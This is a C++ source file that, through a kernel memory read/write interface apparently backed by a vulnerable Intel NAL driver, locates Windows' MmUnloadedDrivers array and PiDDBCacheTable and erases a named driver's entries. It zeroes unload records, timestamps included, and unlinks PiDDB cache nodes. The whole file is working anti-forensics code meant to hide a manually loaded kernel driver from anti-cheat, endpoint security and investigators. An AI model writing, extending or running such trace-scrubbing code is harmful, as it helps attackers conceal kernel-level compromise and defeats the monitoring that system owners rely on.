#include "trace.h"

#include <cstring>
#include <vector>

#include "log.h"
#include "nal.h"

namespace
{
    /* UNLOADED_DRIVERS on x64: UNICODE_STRING Name (0x00, 16 bytes),
     * StartAddress (0x10), EndAddress (0x18), CurrentTime (0x20). */
    constexpr uint32_t kUnloadedCount = 50;
    constexpr uint64_t kUnloadedEntrySize = 0x28;
    constexpr uint64_t kUnloadedNameLength = 0x00;
    constexpr uint64_t kUnloadedNameBuffer = 0x08;

    /* _RTL_BALANCED_LINKS inside _PIDDB_CACHE_ENTRY sits 0x10 past the entry, so
     * the entry address is node - 0x10. Verified by name, never assumed. */
    constexpr uint64_t kTableRootRightChild = 0x10;
    constexpr uint64_t kEntryFromNode = 0x10;

    constexpr uint32_t kMaxNodes = 256;
    constexpr uint32_t kMaxDepth = 64;

    bool KernelRange(uint64_t address, uint64_t size)
    {
        return address >= 0xFFFF800000000000ULL &&
               address + size > address &&
               address + size <= 0xFFFFFFFFFFFFFFFFULL;
    }

    bool Aligned(uint64_t address)
    {
        return (address & 0x7) == 0;
    }

    std::wstring BaseName(const std::wstring& path)
    {
        const std::wstring::size_type pos = path.find_last_of(L"\\/");
        return pos == std::wstring::npos ? path : path.substr(pos + 1);
    }

    bool SameName(const std::wstring& left, const std::wstring& right)
    {
        return _wcsicmp(left.c_str(), right.c_str()) == 0;
    }

    /* Reads a UNICODE_STRING at address and returns its base name. False when the
     * descriptor does not look like one, which is the common case while probing. */
    bool ReadUnicodeName(uint64_t address, std::wstring* out)
    {
        uint8_t descriptor[0x10] = { 0 };
        if (!nal::ReadMemory(address, descriptor, sizeof(descriptor)))
            return false;

        const uint16_t length = *(uint16_t*)(descriptor + 0x00);
        const uint16_t maximum = *(uint16_t*)(descriptor + 0x02);
        const uint64_t buffer = *(uint64_t*)(descriptor + 0x08);

        if (!length || length > 0x200 || length > maximum || (length & 1))
            return false;

        if (!KernelRange(buffer, length))
            return false;

        wchar_t text[0x101] = { 0 };
        if (!nal::ReadMemory(buffer, text, length))
            return false;

        *out = BaseName(std::wstring(text, length / 2));
        return true;
    }
}

namespace trace
{
    /*
     * Neither target is exported by name on current builds - only their contents
     * identify them - so the export is one route and a scan is the other. Both
     * scans look only inside ntoskrnl's writable data, and both cache, so the cost
     * is paid at most once per process.
     */
    uint64_t g_unloadedArray = 0;
    bool     g_unloadedScanned = false;
    uint64_t g_piddbTable = 0;
    bool     g_piddbScanned = false;

    constexpr uint64_t kChunk = 0x10000;
    constexpr uint32_t kMaxCandidates = 256;

    /* Largest writable section of ntoskrnl, which is where both live. */
    bool KernelWritableRange(uint64_t kernelBase, uint64_t* outStart, uint64_t* outSize)
    {
        IMAGE_DOS_HEADER dos = { 0 };
        IMAGE_NT_HEADERS64 nt = { 0 };

        if (!nal::ReadMemory(kernelBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        if (!nal::ReadMemory(kernelBase + dos.e_lfanew, &nt, sizeof(nt)) ||
            nt.Signature != IMAGE_NT_SIGNATURE)
            return false;

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(&nt);
        uint64_t best = 0;
        uint64_t bestSize = 0;

        for (WORD i = 0; i < nt.FileHeader.NumberOfSections; ++i, ++section)
        {
            if (!(section->Characteristics & IMAGE_SCN_MEM_WRITE) || !section->Misc.VirtualSize)
                continue;

            if (section->Misc.VirtualSize > bestSize)
            {
                best = kernelBase + section->VirtualAddress;
                bestSize = section->Misc.VirtualSize;
            }
        }

        if (!best || !bestSize)
            return false;

        *outStart = best;
        *outSize = bestSize;
        return true;
    }

    bool LooksLikeImageName(uint64_t address, std::wstring* out)
    {
        std::wstring name;

        if (!ReadUnicodeName(address, &name) || name.size() < 5)
            return false;

        if (_wcsicmp(name.c_str() + name.size() - 4, L".sys") != 0)
            return false;

        *out = name;
        return true;
    }

    /*
     * The array is kUnloadedCount records of 0x28 bytes, some holding a name that
     * ends in .sys. Candidates are picked out of the buffer without any kernel
     * read, then verified properly, which keeps the scan affordable.
     */
    uint64_t FindUnloadedArray(uint64_t kernelBase)
    {
        uint64_t start = 0;
        uint64_t size = 0;
        std::vector<uint8_t> chunk(kChunk);
        std::vector<uint64_t> candidates;

        if (!KernelWritableRange(kernelBase, &start, &size))
            return 0;

        for (uint64_t offset = 0; offset < size; offset += kChunk)
        {
            const uint64_t span = (size - offset < kChunk) ? size - offset : kChunk;

            if (!nal::ReadMemory(start + offset, chunk.data(), span))
                continue;

            candidates.clear();

            for (uint64_t i = 0; i + kUnloadedEntrySize <= span &&
                 candidates.size() < kMaxCandidates; i += 8)
            {
                const uint16_t length = *(uint16_t*)(chunk.data() + i + kUnloadedNameLength);
                const uint16_t maximum = *(uint16_t*)(chunk.data() + i + kUnloadedNameLength + 2);
                uint64_t buffer = 0;
                uint64_t lowSpan = 0;

                memcpy(&buffer, chunk.data() + i + kUnloadedNameBuffer, sizeof(buffer));
                memcpy(&lowSpan, chunk.data() + i + 0x10, sizeof(lowSpan));

                const bool named = length > 4 && length <= 0x200 && !(length & 1) &&
                                   length <= maximum && KernelRange(buffer, length);

                if (named || KernelRange(lowSpan, 0x1000))
                    candidates.push_back(start + offset + i);
            }

            for (uint64_t candidate : candidates)
            {
                int names = 0;

                for (uint32_t i = 0; i < kUnloadedCount; ++i)
                {
                    std::wstring name;

                    if (LooksLikeImageName(candidate + i * kUnloadedEntrySize, &name))
                        ++names;
                }

                if (names)
                    return candidate;
            }
        }

        return 0;
    }

    /*
     * The table is an RTL_AVL_TABLE; its root's right child at +0x10 leads to a node
     * whose entry sits 0x10 before it. A pointer into writable data that leads to a
     * node carrying a .sys name is the table.
     */
    uint64_t FindPiddbTable(uint64_t kernelBase)
    {
        uint64_t start = 0;
        uint64_t size = 0;
        std::vector<uint8_t> chunk(kChunk);

        if (!KernelWritableRange(kernelBase, &start, &size))
            return 0;

        for (uint64_t offset = 0; offset < size; offset += kChunk)
        {
            const uint64_t span = (size - offset < kChunk) ? size - offset : kChunk;

            if (!nal::ReadMemory(start + offset, chunk.data(), span))
                continue;

            for (uint64_t i = 0; i + sizeof(uint64_t) <= span; i += 8)
            {
                uint64_t table = 0;
                uint64_t root = 0;

                memcpy(&table, chunk.data() + i, sizeof(table));

                if (!KernelRange(table, 0x80))
                    continue;

                if (!nal::ReadMemory(table + kTableRootRightChild, &root, sizeof(root)))
                    continue;

                if (!root)
                    return table;

                if (!KernelRange(root, 0x20))
                    continue;

                for (uint64_t probe = 0x08; probe <= 0x58; probe += 0x08)
                {
                    std::wstring name;

                    if (LooksLikeImageName(root - kEntryFromNode + probe, &name))
                        return table;
                }
            }
        }

        return 0;
    }

    int ScrubUnloadedDrivers(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        /*
         * The export is a pointer variable, so it is dereferenced to reach the
         * array. It is not exported on current builds, so the scan is the route
         * that actually works there.
         */
        const uint64_t symbol = nal::GetKernelModuleExport(kernelBase, "MmUnloadedDrivers");
        uint64_t array = 0;

        if (symbol && KernelRange(symbol, sizeof(uint64_t)))
            nal::ReadMemory(symbol, &array, sizeof(array));

        if (!array || !KernelRange(array, kUnloadedEntrySize))
        {
            if (!g_unloadedScanned)
            {
                g_unloadedArray = FindUnloadedArray(kernelBase);
                g_unloadedScanned = true;
            }

            array = g_unloadedArray;

            if (array)
                km_log::Step("MmUnloadedDrivers found by scan at 0x%llX",
                             (unsigned long long)array);
        }

        if (!array || !KernelRange(array, kUnloadedEntrySize))
        {
            km_log::Warn("MmUnloadedDrivers not resolved - unload trace left in place");
            return 0;
        }

        int cleared = 0;

        for (uint32_t i = 0; i < kUnloadedCount; ++i)
        {
            const uint64_t entry = array + i * kUnloadedEntrySize;
            std::wstring name;

            if (!ReadUnicodeName(entry, &name) || !SameName(name, wanted))
                continue;

            /* Zero the whole record: name, start, end and timestamp. A partially
             * cleared entry is still findable by its timestamp. */
            uint8_t zero[kUnloadedEntrySize] = { 0 };

            if (!nal::WriteMemory(entry, zero, sizeof(zero)))
            {
                km_log::Warn("could not clear unloaded-driver slot %u", i);
                continue;
            }

            ++cleared;
        }

        (void)kUnloadedNameLength;
        (void)kUnloadedNameBuffer;
        return cleared;
    }

    int ScrubPiddbCache(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        const uint64_t symbol = nal::GetKernelModuleExport(kernelBase, "PiDDBCacheTable");
        uint64_t table = 0;

        if (symbol && KernelRange(symbol, sizeof(uint64_t)))
            nal::ReadMemory(symbol, &table, sizeof(table));

        if (!table || !KernelRange(table, 0x80))
        {
            if (!g_piddbScanned)
            {
                g_piddbTable = FindPiddbTable(kernelBase);
                g_piddbScanned = true;
            }

            table = g_piddbTable;

            if (table)
                km_log::Step("PiDDBCacheTable found by scan at 0x%llX",
                             (unsigned long long)table);
        }

        if (!table || !KernelRange(table, 0x80))
        {
            km_log::Warn("PiDDBCacheTable not resolved - cache entry left in place");
            return 0;
        }

        uint64_t root = 0;
        if (!nal::ReadMemory(table + kTableRootRightChild, &root, sizeof(root)))
            return 0;

        uint64_t stack[kMaxDepth] = { 0 };
        uint32_t depth = 0;
        uint32_t visited = 0;
        int unlinked = 0;

        if (root && KernelRange(root, 0x20))
            stack[depth++] = root;

        while (depth && visited < kMaxNodes)
        {
            const uint64_t node = stack[--depth];
            ++visited;

            if (!KernelRange(node, 0x20) || !Aligned(node))
                continue;

            const uint64_t entry = node - kEntryFromNode;

            /* The descriptor offset inside the entry has moved between builds, so
             * probe the header instead of hardcoding one. The name is validated
             * before anything is written. */
            for (uint64_t probe = 0x08; probe <= 0x58; probe += 0x08)
            {
                std::wstring name;

                if (!ReadUnicodeName(entry + probe, &name) || !SameName(name, wanted))
                    continue;

                uint64_t flink = 0;
                uint64_t blink = 0;

                if (!nal::ReadMemory(entry, &flink, sizeof(flink)) ||
                    !nal::ReadMemory(entry + 0x08, &blink, sizeof(blink)))
                    break;

                if (!KernelRange(flink, 0x10) || !KernelRange(blink, 0x10) ||
                    !Aligned(flink) || !Aligned(blink))
                    break;

                /* Only write when the neighbours still point back at this entry;
                 * otherwise the list layout is not what we think it is. */
                uint64_t check = 0;

                if (!nal::ReadMemory(flink + 0x08, &check, sizeof(check)) || check != entry ||
                    !nal::ReadMemory(blink, &check, sizeof(check)) || check != entry)
                {
                    km_log::Warn("PiDDBCache list does not point back at the entry - skipped");
                    break;
                }

                if (!nal::WriteMemory(flink + 0x08, &blink, sizeof(blink)) ||
                    !nal::WriteMemory(blink, &flink, sizeof(flink)))
                {
                    km_log::Warn("could not unlink the PiDDBCache entry");
                    break;
                }

                ++unlinked;
                break;
            }

            uint64_t left = 0;
            uint64_t right = 0;

            if (nal::ReadMemory(node + 0x08, &left, sizeof(left)) && left && KernelRange(left, 0x20) &&
                depth < kMaxDepth)
                stack[depth++] = left;

            if (nal::ReadMemory(node + 0x10, &right, sizeof(right)) && right && KernelRange(right, 0x20) &&
                depth < kMaxDepth)
                stack[depth++] = right;
        }

        return unlinked;
    }

    void Scrub(const std::wstring& imageName)
    {
        const int unloaded = ScrubUnloadedDrivers(imageName);
        const int cached = ScrubPiddbCache(imageName);

        if (unloaded || cached)
            km_log::Good("trace scrub: %d unload slot(s), %d cache entry(ies) cleared for %ls",
                          unloaded, cached, BaseName(imageName).c_str());
        else
            km_log::Warn("trace scrub found nothing for %ls", BaseName(imageName).c_str());
    }
}
